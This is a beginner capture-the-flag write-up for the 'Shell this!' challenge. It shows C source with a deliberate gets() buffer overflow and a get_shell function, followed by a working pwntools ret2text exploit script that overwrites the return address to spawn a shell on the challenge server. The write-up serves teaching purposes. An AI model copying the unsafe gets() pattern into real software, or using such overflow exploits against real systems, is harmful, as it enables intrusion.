# Shell this!

If you have not already, follow us on Twitter for updates and content! [@RagnarSecurity](https://twitter.com/ragnarsecurity)

This is a beginner level challenge. Since this is a beginner level challenge, I will recommend a couple things to people new to pwn CTF challenges: 

- Get gdb-peda 
- Get pwntools
- Practice Practice Practice!
- [Learn Here](https://github.com/RPISEC/MBE): This is a crash course of binary exploitation from RPI. 

How to solve:

## Step 1 - Be a Reverse Engineer! 

We first need to figure out what the program is doing. Luckily we are given source code. 

```c
#include <stdio.h>
#include <unistd.h>

__attribute__((constructor))
void setup() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
}

void get_shell() {
    execve("/bin/sh", NULL, NULL);
}

void vuln() {
    char name[40];

    printf("Please tell me your name: ");
    gets(name);
}

int main(void) {
    printf("Welcome! Can you figure out how to get this program to give you a shell?\n");
    vuln();
    printf("Unfortunately, you did not win. Please try again another time!\n");
}
```

Obviously the exploit is in `vuln`, and it is a buffer overflow. The other interesting thing is we have a get_shell. This means we can create a ret2text exploit. 

How to craft our exploit. 

- Fill the buffer, NOPS, RBP, and VULN's RET with whatever character you desire. 
- Fill main's ret with `get_shell`
- Shell!

```py
from pwn import *

elf = ELF('./shellthis')
p = remote("chal.duc.tf", 30002)

junk = b'A'*56
rop = ROP(elf)
rop.call(elf.symbols['get_shell'])

payload = junk+rop.chain()

p.recvuntil("Please tell me your name: ")
p.sendline(payload)
p.interactive()  
```